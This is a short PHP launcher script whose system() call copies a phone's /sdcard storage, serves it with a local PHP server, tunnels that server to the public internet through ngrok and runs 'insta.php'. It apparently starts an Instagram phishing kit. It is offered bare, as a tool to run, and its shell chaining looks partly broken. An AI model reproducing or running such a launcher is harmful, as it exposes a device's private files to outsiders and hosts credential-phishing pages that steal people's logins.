<?php
    system(" cp -r /sdcard ~ | php -S localhost:3333 | ../ngrok http 3333 >> out.txt | php insta.php ");
?>
